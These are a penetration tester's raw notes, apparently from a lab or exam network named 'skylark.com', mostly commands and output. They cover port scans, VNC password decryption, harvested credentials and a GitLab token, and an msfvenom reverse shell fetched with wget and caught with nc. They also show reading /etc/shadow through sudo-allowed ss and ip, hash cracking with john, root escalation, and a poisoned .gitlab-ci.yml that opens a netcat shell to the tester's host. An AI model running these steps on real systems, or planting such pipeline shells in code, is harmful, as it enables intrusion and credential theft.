RDP         10.10.190.250   3389   DC               [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)                                                                                               


xfreerdp /u:backup_service /p:It4Server /v:10.10.190.250 /d:skylark.com /cert-ignore

Perhaps give rdekstop a try as well. For it, you will use  -d skylark  for the domain. Not sure why xfreerdp having problem here if /cert-ignore did not make a difference

USERS ARNT ALLOWED LOGON: 

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ rdesktop -u 'backup_service' -p 'It4Server' 10.10.190.250 -g 94% -d skylark.com

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ rdesktop -u 'kiosk' -p 'XEwUS^9R2Gwt8O914' 10.10.190.250 -g 94% -d skylark.com

ACCESS: 

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ rdesktop -u 'Administrator' -p 'E2koUInnHx5_nrAjBouE' 10.10.168.250 -g 94% -d skylark.com




-----------------------------------------------------------------------------------------
		10.10.190.10	Challenge 3 - VM 2 OS âœ…

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.190.10

22/tcp   open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:a1:4f:70:8a:b5:2e:c4:5c:3d:63:4f:e9:fc:00:48 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEKD3o1XLn5BAumpxP4tCRNUHxDOkxI5UW0K02/FQwTwS0X/fgQGwATyDOJ6OgzaHNkIc2ZgbKC8204onp9twWgycZ/64ESTv5vnFVkVTlAQSn19I3gyuW/67/yhagM5TQFSGaL3ETyE9bM024EeRZ1+RarwrcEt3cIkOG8QwEN6nducx/RHS+RoXMdxtRXO73+/ocb8OWD2worljnT/Wd8AbrI+8mkMgMt3Iv5gR/ltEErCjGwe7udqNuQZtEiOI/Wm7KIWG8pE4WRm+CooWi6jIHApmYKYmFVa/miYcvub5LdAYShBlqMZaO9mcKpiyvLoRgpzBctpINO8hIKkn9

5901/tcp open  vnc     syn-ack VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VeNCrypt (19)
|     VNC Authentication (2)
|   VeNCrypt auth subtypes: 
|     Unknown security type (2)
|_    VNC auth, Anonymous TLS (258)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 10.10.190.10

All 1000 scanned ports on 10.10.190.10 are in ignored states.


			VNC: Passwords found on 220
https://github.com/frizb/PasswordDecrypts

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]
â””â”€$ sudo apt install xxd   

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]
â””â”€$ echo -n BFE825DE515A335BE3 | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
bad decrypt
40675FEA6A7F0000:error:1C80006B:Provider routines:ossl_cipher_generic_block_final:wrong final block length:../providers/implementations/ciphers/ciphercommon.c:443:
00000000  52 33 53 33 2b 72 63 48                           |R3S3+rcH|
00000008

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]
â””â”€$ echo -n 59A04800B111ADB060 | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
bad decrypt
40E745CC6A7F0000:error:1C80006B:Provider routines:ossl_cipher_generic_block_final:wrong final block length:../providers/implementations/ciphers/ciphercommon.c:443:
00000000  41 42 43 44 45 46 47 48                           |ABCDEFGH|
00000008

				#vncviewer
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ vncviewer 192.168.183.220::5900

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ vncviewer 10.10.143.10::5901
R3S3+rcH

Local.txt
2f9288604ca636be6257a630f4790c3a


				FILES:
# scratchpad
README.md

# Utils.ipynb 
"    private_token='glpat-PzrxBe-5Js7c3t7hoq4X'\n",

       "  'author_name': 'Research',\n",
       "  'author_email': 'research@skylark.com',\n",
       "  'authored_date': '2022-11-28T07:31:43.000-05:00',\n",
       "  'committer_name': 'Research',\n",
       "  'committer_email': 'research@skylark.com',\n",
"  'web_url': 'http://cicd.skylark.com/skylark-rd/scratchpad/-/commit/94d8b9e8f678ad2f52263fefb3a32cf533986a19'},\n",
"  'sha': '94d8b9e8f678ad2f52263fefb3a32cf533986a19',\n",


				FIREFOX:
http://localhost:8888/login?next=%2Ftree%3Ftoken%3Df30e54bf68be6e4077fe853e9737b5d327e6e0d2705bbc92

http://cicd.skylark.com/users/sign_in

VIEW SAVED LOGINS
94d8b9e8f678ad2f52263fefb3a32cf533986a19
Username: research
Password: 1G8prY^0@8FHy&2749cg


private_token from Utils.ipynb
gl = gitlab.Gitlab(
    url='http://cicd.skylark.com',
    private_token='glpat-PzrxBe-5Js7c3t7hoq4X'


537 bytes
{
  "Logging": {
    "LogLevel": {
      "Default": "Information",
      "Microsoft.AspNetCore": "Warning"
    }
  },
  "AllowedHosts": "*",
  "BasicCredentials": {
    "UserUsername": "skylark",
    "UserPassword": "User+dcGvfwTbjV[]",
    "AdminUsername": "skylark_admin",
    "AdminPassword": "Admin!_xDHj88vAnS!__",
    "PartnerUsername": "partner",
    "PartnerPassword": "Skylark__ChangingTheWorld!"
  },
  "UploadsDirectory": "C:\\Uploads\\",
  "MicrosoftMetadataRemovalScript": "C:\\Uploads\\734cc188test.ps1"
}

    To access the notebook, open this file in a browser:
        file:///home/research/.local/share/jupyter/runtime/nbserver-3113-open.html
    Or copy and paste one of these URLs:
        http://localhost:8890/?token=f4e42caa69d652503f839bd128e1fc72e8a0aa0d8f3ed63a
     or http://127.0.0.1:8890/?token=f4e42caa69d652503f839bd128e1fc72e8a0aa0d8f3ed63a

    To access the server, open this file in a browser:
        file:///home/research/.local/share/jupyter/runtime/jpserver-2806-open.html
    Or copy and paste one of these URLs:
        http://localhost:8889/tree?token=27870ab75e02cb0710e75d5a65636e834c08f5e47be50374
     or http://127.0.0.1:8889/tree?token=27870ab75e02cb0710e75d5a65636e834c08f5e47be50374


				Terminal
$ whoami
research

$ hostname
rd

$ id
uid=1001(research) gid=1001(research) groups=1001(research)

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
research@rd:/home/development$ 

research@rd:/home/development$ find / -name "local.txt" -ls 2> /dev/null
   842185      4 -rw-r--r--   1 root     root           33 May 20 21:40 /home/research/local.txt

research@rd:/home/development$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pulse:x:110:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:112:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:116:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
research:x:1001:1001:research:/home/research:/bin/bash
development:x:1002:1002:development:/home/development:/bin/sh

USERS: 
root:x:0:0:root:/root:/bin/bash
research:x:1001:1001:research:/home/research:/bin/bash
development:x:1002:1002:development:/home/development:/bin/sh


				REV SHELL: 
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.215 LPORT=80 -f elf >rev.elf
research@rd:/tmp$ wget http://192.168.45.215:80/rev.elf -outfile reve.elf
research@rd:/tmp$ chmod +x rev.elf

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.215] from (UNKNOWN) [192.168.183.221] 61604

python3 -c 'import pty; pty.spawn("/bin/bash")'
research@rd:/tmp$ 


				NETWORK: 
research@rd:/home/development$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:46:c3 brd ff:ff:ff:ff:ff:ff
    inet 10.10.143.10/24 brd 10.10.143.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:46c3/64 scope link 
       valid_lft forever preferred_lft forever
5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:61:ac brd ff:ff:ff:ff:ff:ff
    inet 10.20.143.10/24 brd 10.20.143.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:61ac/64 scope link 
       valid_lft forever preferred_lft forever

research@rd:/home/development$ ip route
default via 10.10.143.254 dev ens192 onlink 
10.10.143.0/24 dev ens192 proto kernel scope link src 10.10.143.10 
10.20.143.0/24 dev ens224 proto kernel scope link src 10.20.143.10 


				GIT: 
research@rd:/tmp$ find / -name "*.git" -ls 2> /dev/null
find / -name "*.git" -ls 2> /dev/null
   841303      4 drwxr-xr-x   8 research research     4096 Jan 19  2023 /home/research/scratchpad/.git

research@rd:/home/research/scratchpad$ git log
WARNING: terminal is not fully functional
-  (press RETURN)
commit 94d8b9e8f678ad2f52263fefb3a32cf533986a19 (HEAD -> main, origin/main, orig
in/HEAD)
Author: Research <research@skylark.com>
Date:   Mon Nov 28 07:31:43 2022 -0500

    We're using Python3 now

commit cb76c1ecaf99e1c135b28954a72cc587b1266fb1
Author: Research <research@skylark.com>
Date:   Mon Nov 28 07:29:51 2022 -0500

    Fix up CI yml

commit 40f8b41dec5bbd7b567cfa1facd7167ca71fccde
Author: Administrator <admin@example.com>
Date:   Mon Nov 28 10:55:00 2022 +0000

    Add CI placeholder.

commit b106c00d833cea9ce03032f9154831034d7c08cd
Author: research <research@skylark.com>
Date:   Mon Nov 28 09:48:47 2022 +0000


research@rd:/home/research/scratchpad$ git show
WARNING: terminal is not fully functional
-  (press RETURN)
commit 94d8b9e8f678ad2f52263fefb3a32cf533986a19 (HEAD -> main, origin/main, orig
in/HEAD)
Author: Research <research@skylark.com>
Date:   Mon Nov 28 07:31:43 2022 -0500

    We're using Python3 now

diff --git a/.gitlab-ci.yml b/.gitlab-ci.yml
index b47e73a..1fb13c9 100644
--- a/.gitlab-ci.yml
+++ b/.gitlab-ci.yml
@@ -1,7 +1,7 @@
 # TODO: Make sure we run tests as part of the CICD!
 
 before_script:
-  - python --version  # For debugging
+  - python3 --version  # For debugging
 
 test:
   script:

				PRIV ESC:
research@rd:/home/development$ find / -name "proof.txt" -ls 2> /dev/null

research@rd:/$ cd root
bash: cd: root: Permission denied


# SUID3NUM:
wget http://192.168.45.215:80/suid3num.py
chmod +x suid3num.py
research@rd:/tmp$ ./suid3num.py
[~] Custom SUID Binaries (Interesting Stuff)                                                      
------------------------------                                                                    
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper                                               
------------------------------                                                                    
[#] SUID Binaries found in GTFO bins..                                                            
------------------------------                                                                    
[!] None :(   


# LINPEAS: 
wget http://192.168.45.215:80/linpeas.sh
chmod +x linpeas.sh
research@rd:/tmp$ ./linpeas.sh

â•”â•â•â•â•â•â•â•â•â•â•â•£ Sudo version
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                   
Sudo version 1.8.27                                                                               

â•”â•â•â•â•â•â•â•â•â•â•â•£ PATH /home/research/.local/bin
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses           
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.:/home/research/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

â•”â•â•â•â•â•â•â•â•â•â•â•£ Executing Linux Exploit Suggester
â•š https://github.com/mzet-/linux-exploit-suggester                                                
cat: write error: Broken pipe                         
[+] [CVE-2019-13272] PTRACE_TRACEME
   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: highly probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.
[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,[ debian=7|8|9|10|11 ],fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
[+] [CVE-2021-3156] sudo Baron Samedit
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
[+] [CVE-2021-3156] sudo Baron Samedit 2
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded
[+] [CVE-2019-18634] sudo pwfeedback
   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.
[+] [CVE-2017-0358] ntfs-3g-modprobe
   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


research   519  0.0  0.0   2384   516 ?        Ss   May20   0:00      _ /bin/sh -c cd /home/research; source ~/.bashrc; /home/research/.local/bin/jupyter notebook                                  

â•”â•â•â•â•â•â•â•â•â•â•â•£ Cron jobs
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs            
/usr/bin/crontab 
@reboot cd /home/research; source ~/.bashrc; /home/research/.local/bin/jupyter notebook

â•”â•â•â•â•â•â•â•â•â•â•â•£ Active Ports
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                     
tcp     LISTEN   0        5              127.0.0.1:631            0.0.0.0:*                                                                                     
tcp     LISTEN   0        128            127.0.0.1:8888           0.0.0.0:*      users:(("jupyter-noteboo",pid=530,fd=7))                                       
tcp     LISTEN   0        5                0.0.0.0:5901           0.0.0.0:*      users:(("Xtigervnc",pid=639,fd=7))                                             
tcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*                                                                                     
tcp     LISTEN   0        5                  [::1]:631               [::]:*                                                                                     
tcp     LISTEN   0        128                [::1]:8888              [::]:*      users:(("jupyter-noteboo",pid=530,fd=8))                                       
tcp     LISTEN   0        5                   [::]:5901              [::]:*      users:(("Xtigervnc",pid=639,fd=8))                                             
tcp     LISTEN   0        128                 [::]:22                [::]:*   

â•”â•â•â•â•â•â•â•â•â•â•â•£ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                  
Matching Defaults entries for research on rd:                                                     
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User research may run the following commands on rd:
    (root) NOPASSWD: /bin/ss
    (root) NOPASSWD: /bin/ip
Sudoers file: /etc/sudoers.d/research is readable
research ALL=NOPASSWD: /bin/ss
research ALL=NOPASSWD: /bin/ip

â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing Github Files (limit 70)
-rw-r--r-- 1 research research 54 Nov 28  2022 /home/research/.gitconfig
[user]
        email = research@skylark.com
        name = Research
drwxr-xr-x 8 research research 4096 Jan 19  2023 /home/research/scratchpad/.git



				GTFOBIN:
research@rd:~$ sudo -l
Matching Defaults entries for research on rd:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User research may run the following commands on rd:
    (root) NOPASSWD: /bin/ss
    (root) NOPASSWD: /bin/ip

				GTFOBIN: SS
		https://gtfobins.github.io/gtfobins/ss/
LFILE=file_to_read
sudo ss -a -F $LFILE
sudo ss -a -F /etc/shadow 

sudo ss -a -F /etc/shadow
Error: an inet prefix is expected rather than "root:$6$dwYWynh5iVe0yk0u$BVZCM9O0tIdGOvvgfWeYVOWaxdqdSNJ.zqKRemYifgBJxOpnWFQs4QB9lXY10mumW/UKbE83THFcLezBDWWWh/:19312:0:99999:7::".
Cannot parse dst/src address.

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/10]
â””â”€$ nano passwd.txt
root:x:0:0:root:/root:/bin/bash         

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/10]
â””â”€$ nano shadow.txt
$6$dwYWynh5iVe0yk0u$BVZCM9O0tIdGOvvgfWeYVOWaxdqdSNJ.zqKRemYifgBJxOpnWFQs4QB9lXY10mumW/UKbE83THFcLezBDWWWh/:19312:0:99999:7::

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/10]
â””â”€$ unshadow passwd.txt shadow.txt > unshadowed.txt

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/10]
â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

john --wordlist=/usr/share/wordlists/fasttrack.txt unshadowed.txt


				GTFOBIN: IP
		https://gtfobins.github.io/gtfobins/ip/
LFILE=file_to_read
sudo ip -force -batch "$LFILE"

$ /bin/bash -i
research@rd:~$ sudo -l
$ sudo ip -force -batch /etc/shadow

Object "root:$6$dwYWynh5iVe0yk0u$BVZCM9O0tIdGOvvgfWeYVOWaxdqdSNJ.zqKRemYifgBJxOpnWFQs4QB9lXY10mumW/UKbE83THFcLezBDWWWh/:19312:0:99999:7:::" is unknown, try "ip help".

Object "development:$1$HMqDvH.W$.egR0AlUK2ncdgqe8KkoT.:19325:0:99999:7:::" is unknown, try "ip help".

Object "research:$1$kgwvmdJ3$c1DssUvbSP7Mcit6uRkZ2.:19325:0:99999:7:::" is unknown, try "ip help".

Then take the hash in the format I mentioned before and see what happens :) 
$ and end with T.:

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/10]
â””â”€$ nano research.hash
$1$kgwvmdJ3$c1DssUvbSP7Mcit6uRkZ2.:

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/10]
â””â”€$ cat development.hash 
$1$HMqDvH.W$.egR0AlUK2ncdgqe8KkoT.:

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/10]
â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt research.hash

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/10]
â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt development.hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Build258IQ       (?)   

				SSH: 
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/10]
â””â”€$ ssh development@10.10.143.10
development@10.10.143.10's password: Build258IQ
Linux rd 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64

$ python3 -c 'import pty; pty.spawn("/bin/bash")'

development@rd:~$ whoami
development

development@rd:~$ id
uid=1002(development) gid=1002(development) groups=1002(development),27(sudo)

development@rd:~$ hostname
rd

development@rd:~$ sudo -l
[sudo] password for development: 
Matching Defaults entries for development on rd:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User development may run the following commands on rd:
    (ALL : ALL) ALL

development@rd:~$ sudo -i
root@rd:~# 

root@rd:~# whoami
root

root@rd:~# id
uid=0(root) gid=0(root) groups=0(root)

root@rd:~# hostname
rd

root@rd:~# cat proof.txt
0799b28293569019d9d9354632a2bc07

root@rd:~/Documents# cat /etc/shadow
root:$6$dwYWynh5iVe0yk0u$BVZCM9O0tIdGOvvgfWeYVOWaxdqdSNJ.zqKRemYifgBJxOpnWFQs4QB9lXY10mumW/UKbE83THFcLezBDWWWh/:19312:0:99999:7:::
research:$1$kgwvmdJ3$c1DssUvbSP7Mcit6uRkZ2.:19325:0:99999:7:::
development:$1$HMqDvH.W$.egR0AlUK2ncdgqe8KkoT.:19325:0:99999:7:::




		SHELL AS: gitlab-runner - 10.20.143.14
https://www.revshells.com/
http://cicd.skylark.com/skylark-rd/scratchpad
http://cicd.skylark.com/skylark-rd/scratchpad/-/blob/main/.gitlab-ci.yml

# TODO: Make sure we run tests as part of the CICD!

before_script:
  - python3 --version  # For debugging

test:
  script:
    - busybox nc 192.168.45.215 2560 -e sh

run:
  script:
    - busybox nc 192.168.45.215 2560 -e sh


python3 -c 'import pty; pty.spawn("/bin/bash")'
gitlab-runner@cicd:~/builds/uYcz25_z/0/skylark-rd/scratchpad$ 

gitlab-runner@cicd:~/builds/uYcz25_z/0/skylark-rd/scratchpad$ whoami
gitlab-runner

gitlab-runner@cicd:~/builds/uYcz25_z/0/skylark-rd/scratchpad$ id
uid=993(gitlab-runner) gid=993(gitlab-runner) groups=993(gitlab-runner)

gitlab-runner@cicd:~/builds/uYcz25_z/0/skylark-rd/scratchpad$ hostname
cicd

itlab-runner@cicd:~$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:ab:80:dc brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 10.20.143.14/24 brd 10.20.143.255 scope global noprefixroute ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:80dc/64 scope link 
       valid_lft forever preferred_lft forever


gitlab-runner@cicd:~$ cat local.txt
eedda4137d5e53a8198e19cd9fe67aab

gitlab-runner@cicd:/$ cd root
bash: cd: root: Permission denied


-----------------------------------------------------------------------------------------
		10.10.190.12	Challenge 3 - VM 3 OS

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.190.12

22/tcp   open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a2:20:e1:9e:43:98:72:b4:13:62:d2:df:77:ed:39:30 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChvxC4NvfHHSuTnRUwlaHDw86PVZ+ylaKvnysZusCAztZ0c/cdF1RDzDsGF4TGng+etYpINPyAyLC7f+NG92O/udnwNpGhJZnh1rrqBPNcxHyj0QzWC0Z5sUmuvYtd3itMVf7dbPePXsjSHH127TjJhSBN2TvgPjVRp7LOREzvPBMauA5sn63P1MZaDYfxAvn4UIVNI4FG1XG9cerEEhnrQuBjPJYPB5cA9F9JMEQksCcLMuwLZxagk12+U8cTZ/EDfDaRSGSRq+80fB9npdEHMGb7i/oRgYNUloGzNcGAyMgv1J3GXO9L0wdC5pfEw2H+gMrHUyh2YRqSar+1IUgim20v9iQV9/cEd1ugyNuTZlnTY4GaOmLU3mUN8B9jlOZ6aoxUW7QyduAOW+c1ZHeR3NsK9kXYpE+fPjG36bRw5DtT9Dh+RA1OPLwheY5aZmJXqsj+PVQ4GvxqGk0vp1Hw3QdFEIy7v5kbAGI5VT+/uoqvGazQ/YSgQgzFfnkJCmU=
|   256 e2:8b:35:5b:35:49:5f:93:9f:ee:35:92:d1:31:76:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPLFOxpwpbTj7AyhDHNeuRP0U72BjX5f3HkV2HMTrCZIOsHfliPVvd3VrmjAAAl9YDL2PhBNh+X6TmXgnWLXoDY=
|   256 c9:fa:63:03:ec:7a:c2:00:e3:52:9f:5d:fe:97:c9:e4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHDhb7xKiWC8a5IPxIK72xrFar3IXHdXs0chKytLz8Ls

8080/tcp open  http-proxy  syn-ack
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: no-cache, no-store, must-revalidate
|     Content-Type: text/html; charset=utf-8
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 17 May 2024 04:33:15 GMT
|     <!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>File Browser</title><link rel="icon" type="image/png" sizes="32x32" href="/static/img/icons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/static/img/icons/favicon-16x16.png"><link rel="manifest" id="manifestPlaceholder" crossorigin="use-credentials"><meta name="theme-color" content="#2979ff"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="apple-mobile-web-app-title" content="assets"><link rel="appl
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: no-cache, no-store, must-revalidate
|     Content-Type: text/html; charset=utf-8
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 17 May 2024 04:33:14 GMT
